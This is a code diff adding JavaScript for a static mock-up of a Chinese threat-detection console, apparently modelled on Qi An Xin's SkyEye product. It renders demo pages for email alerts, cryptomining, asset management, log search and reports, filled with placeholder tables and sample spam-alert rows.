+function renderSituation(){
+  document.getElementById('view').className='';
+  document.getElementById('view').innerHTML=
+  '<div style="background:transparent;min-height:calc(100vh - 110px);padding:14px;border-radius:4px;position:relative;display:flex;align-items:center;justify-content:center">'+
+    '<img src="assets/ty/screen-full.png" style="width:100%;max-width:1500px;display:block">'+
+    '<img src="assets/ty/sit-cube.png" onclick="navTo(\'#/situation-pro\')" title="切换3D高级版" style="position:absolute;top:14px;right:14px;width:34px;height:31px;cursor:pointer;z-index:5">'+
+  '</div>';
+}
+function renderGlobe(){}
+
+/* ============ 视图：态势感知高级版 ============ */
+function renderSituationPro(){
+  document.getElementById('view').className='';
+  document.getElementById('view').innerHTML=
+  '<div class="info-banner">[i] 新增3D游戏引擎可视化，支持地图高交互下钻，安装胶囊客户端即可体验！</div>'+
+  '<div class="card" style="padding:10px 16px"><img src="assets/ty/sitpro-steps.png" style="width:100%;display:block"></div>'+
+  '<div class="preview-grid">'+
+    '<div class="card"><div class="card-title">天眼威胁感知系统 <span class="badge-ver" style="background:#0B66C7">体验版</span></div>'+
+      '<div class="card-body"><img src="assets/ty/sitpro-preview1.png" style="width:100%;display:block"></div></div>'+
+    '<div class="card"><div class="card-title">天眼威胁感知系统 <span class="badge-ver" style="background:#8B5CF6">高级版</span></div>'+
+      '<div class="card-body"><img src="assets/ty/sitpro-preview2.png" style="width:100%;display:block"></div></div>'+
+  '</div>';
+}
+
+/* ============ 视图：邮件威胁检测系统 ============ */
+var mailRows=[
+ ['2022-08-08 00:34:21','36.249.109.20','wodj@mldi.com','shanghai@sinosteel....','常规垃圾邮件','幸'],
+ ['2022-08-08 00:32:22','52.68.127.213','no-reply@fromjapan...','zhangljb@sinosteel.c...','常规垃圾邮件','【最后2天！】Ra...'],
+ ['2022-08-08 00:16:54','175.43.32.44','xqsoc@kawte.com','office@sinosteel.com','常规垃圾邮件','义']
+];
+function renderAlertMail(){
+  document.getElementById('view').innerHTML=
+  '<div class="tabs" style="margin-bottom:12px"><a class="tab active" onclick="mailTab(this,0)">全部告警</a><a class="tab" onclick="mailTab(this,1)">恶意附件告警</a><a class="tab" onclick="mailTab(this,2)">钓鱼邮件告警</a></div>'+
+  '<div class="query-row">'+
+    '<div class="q-item"><label>发件人IP</label><input placeholder="*进行模糊匹配"></div>'+
+    '<div class="q-item"><label>告警类型</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>告警设备</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>威胁级别</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>处理状态</label><select><option>请选择</option></select></div>'+
+  '</div>'+
+  '<div class="stat-bar">'+
+    '<span>共计 <b>3</b> 条告警</span>'+
+    '<span class="st"><i class="st-ico" style="background:#F59E0B"></i>高危：<b>0</b> 条</span>'+
+    '<span class="st"><i class="st-ico" style="background:#F5A623"></i>中危：<b>0</b> 条</span>'+
+    '<span class="st"><i class="st-ico" style="background:#4A90E2"></i>低危：<b>3</b> 条</span>'+
+    '<span class="st"><i class="st-ico" style="background:#2E7BD6"></i>未读告警：<b>3</b> 条</span>'+
+    '<div style="margin-left:auto;width:220px;height:34px" id="mailTrend"></div>'+
+  '</div>'+
+  '<div style="display:flex;gap:8px;margin-bottom:12px"><button class="btn sm" onclick="toast(\'事件提交（演示）\')">事件提交</button><button class="btn sm plain" onclick="toast(\'自定义标签\')">自定义标签</button><button class="btn sm plain" onclick="toast(\'标记已读\')">标记已读</button><button class="btn sm plain" onclick="toast(\'标记未读\')">标记未读</button><button class="btn sm plain" onclick="toast(\'更多\')">···</button><span style="margin-left:auto"><button class="btn sm" onclick="toast(\'导出中\')">导出</button></span></div>'+
+  '<div class="tbl-wrap" id="mailTable"></div>';
+  mkChart(document.getElementById('mailTrend'),{grid:{left:0,right:0,top:2,bottom:0},xAxis:{type:'category',show:false,data:[1,2,3,4,5,6,7]},yAxis:{type:'value',show:false},series:[{type:'line',data:[3,0,0,0,0,0,0],step:'end',showSymbol:false,lineStyle:{color:'#F5443D',width:1.5},areaStyle:{color:'rgba(245,68,61,.25)'}}]});
+  renderMailTable(0);
+}
+function mailTab(el,idx){
+  document.querySelectorAll('.tabs .tab').forEach(function(t){t.classList.remove('active')});
+  el.classList.add('active');
+  if(idx>0){document.getElementById('mailTable').innerHTML='<div style="padding:40px">'+emptyHTML('当前分类暂无数据')+'</div>';return}
+  renderMailTable(0);
+}
+function renderMailTable(){
+  var h='<table class="tbl"><colgroup><col style="width:34px"><col style="width:130px"><col style="width:110px"><col style="width:150px"><col style="width:150px"><col style="width:110px"><col style="width:150px"><col style="width:150px"><col style="width:64px"><col style="width:80px"><col style="width:64px"><col style="width:110px"></colgroup>'+
+  '<thead><tr><th></th><th>发件时间 ↕</th><th>发件人IP ↕</th><th>发件人 ↕</th><th>收件人 ↕</th><th>告警类型 ↕</th><th>邮件主题 ↕</th><th>告警设备 ↕</th><th>威胁级别 ↕</th><th>告警标签</th><th>事件</th><th>操作</th></tr></thead><tbody>';
+  mailRows.forEach(function(r){
+    h+='<tr><td><input type="checkbox"></td><td class="mono">'+r[0]+'</td><td class="ip">'+r[1]+'</td><td>'+r[2]+'</td><td>'+r[3]+'</td><td>'+r[4]+'</td><td>'+r[5]+'</td><td>奇安信邮件威胁检测系统</td><td>'+lvTag('低危')+'</td><td></td><td>未上报</td><td class="ops"><a onclick="toast(\'详情（演示）\')">详情</a><a onclick="toast(\'处置（演示）\')">处置</a><a onclick="toast(\'加白（演示）\')">加白</a></td></tr>';
+  });
+  h+='</tbody></table>'+pagerHTML(3,1,10,'mailPg');
+  document.getElementById('mailTable').innerHTML=h;
+}
+function mailPgGo(){}function mailPgSize(){}function mailPgJump(){}
+
+/* ============ 视图：其他告警来源（空态） / 全部 ============ */
+function renderAlertEmpty(title){
+  document.getElementById('view').innerHTML=
+  '<div class="stat-bar"><span>共计 <b>0</b> 条告警</span></div>'+
+  '<div class="tbl-wrap" style="padding:50px 10px">'+emptyHTML(title+'暂无数据')+'</div>';
+}
+/* ============ 视图：挖矿专项 ============ */
+function renderMining(){
+  document.getElementById('view').innerHTML=
+  '<div class="mining-banner" style="padding:0;overflow:hidden"><img src="assets/ty/mining-banner.png" style="width:100%;display:block"></div>'+
+  '<div class="query-row">'+
+    '<div class="q-item"><label>资产IP</label><input></div>'+
+    '<div class="q-item"><label>挖矿阶段</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>挖矿币种</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>矿池地址</label><input></div>'+
+    '<div class="q-item"><label>钱包地址</label><input></div>'+
+    '<span style="margin-left:auto"><button class="btn" onclick="toast(\'查询完成（演示）\')">查询</button></span>'+
+  '</div>'+
+  '<div class="query-row" style="margin-top:-4px"><div class="q-item"><label>攻击结果</label><select><option>请选择</option></select></div></div>'+
+  '<div class="card"><div style="display:flex;justify-content:space-between;align-items:center;padding:12px 16px"><b>挖矿资产总数 <span style="color:#F5443D">0</span></b><button class="btn sm" onclick="toast(\'导出中\')">导出</button></div>'+
+  '<table class="tbl"><colgroup><col style="width:34px"><col><col><col><col><col><col><col><col><col><col></colgroup>'+
+  '<thead><tr><th></th><th>资产IP</th><th>资产组</th><th>挖矿阶段</th><th>矿池地址</th><th>挖矿币种</th><th>挖矿客户端</th><th>钱包地址/UserID</th><th>攻击结果</th><th>最近访问时间 ↕</th><th>操作</th></tr></thead>'+
+  '<tbody><tr><td colspan="11">'+emptyHTML('暂无数据')+'</td></tr></tbody></table>'+
+  pagerHTML(0,1,10,'minPg')+'</div>';
+}
+function minPgGo(){}function minPgSize(){}function minPgJump(){}
+
+/* ============ 视图：威胁情报 ============ */
+function renderThreatIntel(){
+  document.getElementById('view').innerHTML=
+  '<div class="query-row">'+
+    '<div class="q-item"><label>时间范围</label><select><option>今天</option></select></div>'+
+    '<div class="q-item"><label>情报类型</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>关键字</label><input placeholder="IP / 域名 / 文件哈希"></div>'+
+    '<span style="margin-left:auto"><button class="btn" onclick="toast(\'查询完成（演示）\')">查询</button></span>'+
+  '</div>'+
+  '<div class="card"><div class="card-title">威胁情报列表</div>'+
+  '<div style="padding:40px 10px">'+emptyHTML('暂无威胁情报数据（演示）')+'</div></div>';
+}
+
+/* ============ 视图：资产视角 ============ */
+function renderAssetView(){
+  var rows='';
+  for(var j=0;j<6;j++){
+    rows+='<tr><td><input type="checkbox"></td><td class="ip">10.90.1.1</td><td>11</td><td class="ip">10.90.1.1</td><td>内部IP</td><td>0</td><td>46</td><td><span class="tag tag-info">低可疑</span></td><td class="ops"><a onclick="toast(\'详情（演示）\')">详情</a></td></tr>';
+  }
+  document.getElementById('view').innerHTML=
+  '<div class="query-row">'+
+    '<div class="q-item"><label>时间</label><select><option>今天</option></select></div>'+
+    '<div class="q-item"><label>资产名称</label><input></div>'+
+    '<div class="q-item"><label>登录资产IP</label><input></div>'+
+    '<div class="q-item"><label>失陷状态</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>处理状态</label><select><option>未处置</option></select></div>'+
+    '<span style="margin-left:auto"><button class="btn" onclick="toast(\'查询完成（演示）\')">查询</button></span>'+
+  '</div>'+
+  '<div class="query-row" style="margin-top:-4px"><div class="q-item"><label>白名单</label><select><option>否</option></select></div></div>'+
+  '<div class="card"><div style="display:flex;gap:30px;padding:10px 16px;border-bottom:1px solid #eef1f2">'+
+    '<span style="color:#555">资产安全状态分布</span>'+
+    '<span style="color:#0B66C7;font-size:14px;display:flex;align-items:center;gap:6px">风险资产TOP10</span></div>'+
+  '<div class="split2" style="padding:20px 16px">'+
+    '<div id="avFunnel" style="height:200px"></div>'+
+    '<div id="avBar" style="height:260px"></div>'+
+  '</div></div>'+
+  '<div class="tbl-wrap" style="margin-top:14px">'+
+    '<div style="display:flex;justify-content:flex-end;padding:10px 12px"><button class="btn sm" onclick="toast(\'导出中\')">导出</button></div>'+
+    '<table class="tbl"><colgroup><col style="width:34px"><col><col><col><col><col><col><col><col></colgroup>'+
+    '<thead><tr><th></th><th>资产名称</th><th>风险值 ↕</th><th>登录资产IP</th><th>资产组</th><th>漏洞数</th><th>告警事件数</th><th>失陷状态</th><th>操作</th></tr></thead>'+
+    '<tbody>'+rows+'</tbody></table>'+
+  '</div>';
+  mkChart(document.getElementById('avFunnel'),{series:[{type:'funnel',left:'10%',width:'80%',gap:2,label:{show:true,position:'inside',color:'#fff',formatter:'{b} ({c})'},itemStyle:{color:'#9CC8F5'},data:[{name:'系统',value:21},{name:'内部IP',value:21}]}]});
+  mkChart(document.getElementById('avBar'),{grid:{left:36,right:16,top:24,bottom:40},xAxis:{type:'category',data:['10.0.21.98','10.0.5.11','10.0.2.138','10.0.21.35','10.0.6.152','10.0.26.253','10.0.4.12','10.0.11.2','10.0.3.101','10.237.237.33'],axisLabel:{rotate:35,fontSize:10,fontFamily:'Consolas'}},yAxis:{type:'value',max:20,name:'风险值'},series:[{type:'bar',data:[20,20,11,11,11,11,11,11,11,11],itemStyle:{color:'#2E86E8'},barWidth:'45%'}]});
+}
+/* ============ 视图：日志检索 ============ */
+function renderLogSearch(){
+  document.getElementById('view').innerHTML=
+  '<div style="display:flex;justify-content:flex-end;gap:14px;margin-bottom:10px;font-size:12.5px;color:#0B66C7">'+
+    '<a onclick="toast(\'常用检索场景（演示）\')">常用检索场景</a><a onclick="toast(\'经验值固化（演示）\')">经验值固化</a><a onclick="toast(\'解码小助手（演示）\')">解码小助手</a></div>'+
+  '<div class="search-bar">'+
+    '<select style="height:34px;border:1px solid #d4dae3;border-radius:3px"><option>专家模式</option></select>'+
+    '<select style="height:34px;border:1px solid #d4dae3;border-radius:3px"><option>本级</option></select>'+
+    '<div class="idx-pop" style="position:relative">'+
+      '<button class="btn plain" style="height:34px" onclick="event.stopPropagation();document.getElementById(\'idxPopup\').classList.toggle(\'open\')">索引类型 ▾</button>'+
+      '<div class="idx-popup" id="idxPopup" onclick="event.stopPropagation()">'+
+        '<div class="idx-group"><h6><label><input type="checkbox"> 告警日志</label></h6><div class="idx-grid">'+
+          ['威胁告警','webshell上传','网页漏洞利用','网络攻击','威胁情报告警','沙箱检测告警','邮件威胁检测告警','蜜罐告警','网神云锁'].map(function(x){return '<label><input type="checkbox"> '+x+'</label>'}).join('')+
+        '</div></div>'+
+        '<div class="idx-group"><h6><label><input type="checkbox"> 网络日志</label></h6><div class="idx-grid">'+
+          ['Web访问','TCP流量','文件传输','域名解析','SSL加密协商','数据库操作','FTP控制通道','登录动作','网络异常报文','LDAP行为','邮件行为','MQ流量','网络阻断','telnet行为','UDP流量'].map(function(x){return '<label><input type="checkbox"> '+x+'</label>'}).join('')+
+        '</div></div>'+
+        '<div class="idx-group"><h6><label><input type="checkbox"> 终端日志</label></h6><div class="idx-grid">'+
+          ['IM文件传输','邮件附件传输','DNS访问审计','终端进程信息','U盘文件传输'].map(function(x){return '<label><input type="checkbox"> '+x+'</label>'}).join('')+
+        '</div></div>'+
+        '<div class="idx-group"><h6><label><input type="checkbox"> 第三方日志</label></h6></div>'+
+        '<div style="text-align:right;border-top:1px solid #eef1f6;padding-top:12px"><button class="btn" onclick="closeIdxPop()">确定</button> <button class="btn plain" onclick="toast(\'已重置\')">重置</button></div>'+
+      '</div>'+
+    '</div>'+
+    '<input style="flex:1;height:34px;border:1px solid #d4dae3;border-radius:3px;padding:0 10px" placeholder="请输入关键字搜索">'+
+    '<input style="height:34px;border:1px solid #d4dae3;border-radius:3px;padding:0 10px" value="2022-08-08 00:00:00 - 2022-08-08 01:47:30">'+
+    '<button class="btn" style="height:34px" onclick="toast(\'检索完成（演示）\')">搜索</button>'+
+  '</div>'+
+  '<div class="card" style="margin-top:20px"><div style="padding:60px 10px">'+emptyHTML('暂无检索结果（演示）')+'</div></div>';
+  document.onclick=function(){var p=document.getElementById('idxPopup');if(p)p.classList.remove('open')};
+}
+function closeIdxPop(){document.getElementById('idxPopup').classList.remove('open')}
+
+/* ============ 视图：资产管理 ============ */
+function renderAssetManage(){
+  var ips=['8.208.76.245','64.145.93.198','47.91.21.64','216.131.89.63','216.131.78.250','127.0.0.1','47.88.93.27','185.147.215.17','176.67.86.251','216.131.80.250'];
+  var rows=ips.map(function(ip){return '<tr><td><input type="checkbox"></td><td class="ip">'+ip+'</td><td class="ip">'+ip+'</td><td><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9aa5b3" stroke-width="1.5" style="vertical-align:middle"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg></td><td>1</td><td></td><td>未知资产组</td><td>本地设备</td><td></td><td></td><td class="ops"><a onclick="toast(\'查看资产（演示）\')">查看</a><a onclick="toast(\'编辑资产（演示）\')">编辑</a><a onclick="toast(\'删除（演示）\')">删除</a></td></tr>'}).join('');
+  document.getElementById('view').innerHTML=
+  '<div class="query-row">'+
+    '<div class="q-item"><label>最后活动时间</label><input placeholder="⊙ 选择时间范围" style="min-width:150px"></div>'+
+    '<div class="q-item"><label>资产IP</label><input placeholder="*进行模糊匹配"></div>'+
+    '<div class="q-item"><label>资产名称</label><input></div>'+
+    '<div class="q-item"><label>分类</label><select><option>全部</option></select></div>'+
+    '<div class="q-item"><label>物理地址</label><input></div>'+
+    '<div class="q-item"><label>网关标识</label><select><option>请选择</option></select></div>'+
+    '<span style="margin-left:auto"><button class="btn" onclick="toast(\'查询完成（演示）\')">查询</button></span>'+
+  '</div>'+
+  '<div class="asset-layout">'+
+    '<div class="card tree-box">'+
+      '<div class="card-title" style="padding:8px 4px">资产分组</div>'+
+      '<input class="tree-filter" placeholder="输入关键字进行过滤">'+
+      '<div class="tree-node" onclick="toast(\'切换到资产分组：全部 (17557)\')">▼ <img src="assets/ty/tree-folder.png" style="height:16px;width:auto;vertical-align:middle"> 全部 (17557)</div>'+
+      '<div class="tree-node" style="padding-left:22px" onclick="toast(\'切换到资产组：未知资产组 (26)\')"><input type="checkbox" checked> 未知资产组 (26)</div>'+
+      '<div class="tree-node" style="padding-left:22px" onclick="toast(\'切换到资产组：未分配资产组 (1353)\')"><input type="checkbox"> 未分配资产组 (1353)</div>'+
+      '<div class="tree-node" style="padding-left:22px" onclick="toast(\'切换到资产组：内部IP (16178)\')"><input type="checkbox"> 内部IP (16178)</div>'+
+      '<div style="margin-top:30px;padding:10px 4px;border-top:1px solid #eef1f6;color:#555">资产标签</div>'+
+    '</div>'+
+    '<div class="tbl-wrap">'+
+      '<div style="display:flex;gap:8px;padding:10px 12px">'+
+        '<button class="btn sm" onclick="toast(\'资产新增（演示）\')">资产新增</button>'+
+        '<button class="btn sm plain" onclick="toast(\'批量删除（演示）\')">批量删除</button>'+
+        '<button class="btn sm plain" onclick="toast(\'新增标签（演示）\')">新增标签</button>'+
+        '<button class="btn sm plain" onclick="toast(\'移动到（演示）\')">移动到 ▾</button>'+
+        '<span style="margin-left:auto"><button class="btn sm plain" onclick="toast(\'批量导入（演示）\')">批量导入</button> <button class="btn sm" onclick="toast(\'导出中\')">导出</button></span>'+
+      '</div>'+
+      '<table class="tbl"><colgroup><col style="width:34px"><col style="width:120px"><col style="width:120px"><col style="width:70px"><col style="width:50px"><col style="width:80px"><col style="width:110px"><col style="width:90px"><col style="width:90px"><col style="width:70px"><col></colgroup>'+
+      '<thead><tr><th></th><th>资产IP</th><th>资产名称</th><th>分类</th><th>权重 ↕</th><th>责任人</th><th>资产组</th><th>发现来源</th><th>资产标签</th><th>网关标识</th><th>操作</th></tr></thead>'+
+      '<tbody>'+rows+'</tbody></table>'+
+      '<div class="pager"><span>共 26 条</span><select onchange="toast(\'切换每页条数（演示）\')"><option>10条/页</option></select><button class="pg-btn" onclick="toast(\'已是第一页（演示）\')">‹</button><button class="pg-btn on" onclick="toast(\'第1页（演示）\')">1</button><button class="pg-btn" onclick="toast(\'第2页（演示）\')">2</button><button class="pg-btn" onclick="toast(\'第3页（演示）\')">3</button><button class="pg-btn" onclick="toast(\'下一页（演示）\')">›</button></div>'+
+    '</div>'+
+  '</div>';
+}
+
+/* ============ 视图：快速报表 ============ */
+function renderReport(){
+  document.getElementById('view').innerHTML=
+  '<div class="query-row">'+
+    '<div class="q-item"><label>报表类型</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>执行状态</label><select><option>请选择</option></select></div>'+
+    '<div class="q-item"><label>任务名称/创建...</label><input></div>'+
+    '<span style="margin-left:auto"><button class="btn" onclick="toast(\'搜索（演示）\')">搜索</button></span>'+
+  '</div>'+
+  '<div class="tbl-wrap">'+
+    '<div style="display:flex;gap:8px;padding:10px 12px">'+
+      '<button class="btn sm" onclick="toast(\'新增报表任务（演示）\')">新增</button>'+
+      '<button class="btn sm danger" onclick="toast(\'批量删除（演示）\')">批量删除</button>'+
+      '<span style="margin-left:auto"><button class="btn sm" onclick="toast(\'导出中\')">导出</button></span>'+
+    '</div>'+
+    '<table class="tbl"><colgroup><col style="width:34px"><col><col style="width:70px"><col style="width:90px"><col style="width:90px"><col><col style="width:140px"><col style="width:80px"><col style="width:60px"><col></colgroup>'+
+    '<thead><tr><th></th><th>报表名称</th><th>报表类型</th><th>创建人</th><th>创建人角色</th><th>数据范围</th><th>最近执行时间 ↕</th><th>执行状态</th><th>下载</th><th>操作</th></tr></thead>'+
+    '<tbody><tr><td><input type="checkbox"></td><td>告警列表-流量传感器-2022-0...</td><td>导出</td><td></td><td>监测</td><td>2022-08-01 00:00:00 to 2022-08-07 1...</td><td>2022-08-07 11:30:44</td><td>成功</td><td><img src="assets/ty/csv-badge.png" style="height:20px;vertical-align:middle"></td>'+
+    '<td class="ops"><a onclick="toast(\'下载（演示）\')">下载</a><a onclick="toast(\'查看（演示）\')">查看</a><a onclick="toast(\'重新生成（演示）\')">重新生成</a><a onclick="toast(\'停止执行（演示）\')">停止执行</a></td></tr></tbody></table>'+
+    '<div class="pager"><span>共 1 条</span><select onchange="toast(\'切换每页条数（演示）\')"><option>10条/页</option></select><button class="pg-btn" onclick="toast(\'已是第一页（演示）\')">‹</button><button class="pg-btn on" onclick="toast(\'第1页（演示）\')">1</button><button class="pg-btn" onclick="toast(\'已是最后一页（演示）\')">›</button><span class="jump">前往 <input value="1"> 页</span></div>'+
+  '</div>';
+}
+
+/* ============ 视图：安全工具 ============ */
+function renderTools(){
+  var cards=[
+    ['威胁情报告警','获取威胁情报产生的告警数据，并打包下载','v3.0.7.6以上 v4.0.7.6以上'],
+    ['传感器规则告警','获取传感器规则产生的告警数据，并打包下载','v3.0.7.6以上 v4.0.7.6以上'],
+    ['行为分析日志导出','获取行为分析产生的告警数据，并打包下载','v3.0.7.7以上 v4.0.7.7以上']
+  ];
+  document.getElementById('view').innerHTML=
+  '<div class="card" style="padding:12px 16px;display:flex;justify-content:flex-end;align-items:center">'+
+    '<label style="display:flex;align-items:center;gap:8px;cursor:pointer">安全服务：<input type="checkbox" checked onchange="toast(this.checked?\'安全服务已开启\':\'安全服务已关闭\')"></label></div>'+
+  '<div style="display:flex;justify-content:flex-end;margin-bottom:12px"><button class="btn sm" onclick="toast(\'新增安全工具（演示）\')">新增</button></div>'+
+  '<div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">'+
+    cards.map(function(c){return '<div class="card" style="margin-bottom:0"><div class="card-title">'+c[0]+'<span class="tools" style="display:flex;gap:10px;cursor:pointer"><img src="assets/ty/tool-gear.png" style="height:16px;width:auto;vertical-align:middle" onclick="toast(\'工具设置（演示）\')"><img src="assets/ty/tool-close.png" style="height:16px;width:auto;vertical-align:middle" onclick="toast(\'关闭工具卡片（演示）\')"></span></div>'+
+    '<div class="card-body" style="font-size:12.5px;line-height:2.1;color:#555">'+
+    '<div>工具简介：'+c[1]+'</div><div>程序提供方：奇安信集团</div><div>奇安信集团1.0.0.1</div><div>适配系统版本：'+c[2]+'</div><div>发布时间：2020-01-10</div></div></div>'}).join('')+
+  '</div>'+
+  '<div class="pager" style="justify-content:flex-end"><span>共 3 条</span><select onchange="toast(\'切换每页条数（演示）\')"><option>4条/页</option></select><button class="pg-btn" onclick="toast(\'已是第一页（演示）\')">‹</button><button class="pg-btn on" onclick="toast(\'第1页（演示）\')">1</button><button class="pg-btn" onclick="toast(\'已是最后一页（演示）\')">›</button></div>';
+}
+
+/* ============ 路由分发 ============ */
+var ROUTES={
+ '/dashboard':renderDashboard,'/system-monitor':renderTopology,'/workbench':renderWorkbench,
+ '/situation':renderSituation,'/situation-pro':renderSituationPro,
+ '/alert-traffic':renderAlertTraffic,'/alert-mail':renderAlertMail,
+ '/alert-all':function(){renderAlertEmpty('全部')},'/alert-file':function(){renderAlertEmpty('文件威胁鉴定器')},
+ '/alert-honeypot':function(){renderAlertEmpty('攻击诱捕系统')},'/alert-smac':function(){renderAlertEmpty('智慧管理分析系统(SMAC)')},
+ '/alert-yunsuo':function(){renderAlertEmpty('服务器安全管理系统(云锁)')},'/alert-soar':function(){renderAlertEmpty('SOAR自动化编排场景')},
+ '/mining':renderMining,'/threat-intel':renderThreatIntel,
+ '/asset-view':renderAssetView,'/attacker-view':function(){document.getElementById('view').innerHTML='<div class="card" style="padding:60px 10px">'+emptyHTML('攻击者视角暂无数据（演示）')+'</div>'},
+ '/log-search':renderLogSearch,'/asset-manage':renderAssetManage,
+ '/report':renderReport,'/tools':renderTools
+};
+function dispatch(){
+  var route=currentRoute();
+  disposeCharts();
+  closeDetail();
+  renderSidebar(route);
+  renderCrumb(route);
+  // 顶栏激活态
+  var sec='monitor';
+  if(route.indexOf('/alert')===0||['/mining','/threat-intel','/asset-view','/attacker-view'].indexOf(route)>=0)sec='threat';
+  else if(route.indexOf('/log')===0)sec='analysis';
+  else if(route.indexOf('/asset')===0)sec='asset';
+  else if(route.indexOf('/report')===0)sec='report';
+  else if(route.indexOf('/tools')===0)sec='more';
+  document.querySelectorAll('#topnav .tn-item').forEach(function(el){el.classList.toggle('active',el.getAttribute('data-sec')===sec)});
+  var fn=ROUTES[route];
+  document.getElementById('view').className='';
+  if(fn)fn();else document.getElementById('view').innerHTML=genericEmpty('演示页面');
+}
+window.addEventListener('hashchange',dispatch);
+dispatch();
+//<!-- APPEND -->
+</script>
+</body>
+</html>
